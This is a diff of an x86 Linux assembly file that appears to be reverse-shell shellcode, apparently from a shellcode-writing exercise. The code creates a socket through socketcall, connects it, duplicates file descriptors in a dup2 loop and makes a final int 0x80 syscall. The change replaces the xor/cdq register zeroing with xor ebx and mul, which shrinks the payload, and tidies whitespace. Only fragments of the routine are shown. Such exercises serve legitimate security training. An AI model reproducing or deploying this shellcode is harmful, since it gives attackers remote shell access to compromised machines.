@@ -25,18 +25,17 @@ _start:
 
 	; create_socket
 
-    	;null eax for cdq
-    	xor eax, eax
+    ;null ebx for mul
+    xor ebx, ebx
 
-	;null the edx
-    	cdq
+	;null the eax,edx
+    mul ebx
 
 	; syscall 102 in eax
 	push byte 0x66
  	pop eax
 
 	; 1 in ebx for type of socketcall
-	xor ebx, ebx
 	inc ebx
 
 	; Build the array of arg
@@ -61,7 +60,7 @@ _start:
 	; socket_connect
 	; mov socket syscall number in eax
 	push byte 0x66
-    	pop eax
+    pop eax
 
 	; increment ebx for AF_INET
 	inc ebx
@@ -79,7 +78,7 @@ _start:
 	mov ecx, esp
 
  	; Push the sizeof arg array
-    	push byte 0x10
+    push byte 0x10
 
 	; Push the struct pointer
 	push ecx
@@ -105,7 +104,7 @@ _start:
 
 	; Set 2 in ecx
 	push byte 0x2
-    	pop ecx
+    pop ecx
 
 	; Dup2 loop instructions
 	dup_loop:
@@ -151,3 +150,4 @@ _start:
 
 	; Interrupt
 	int 0x80
+
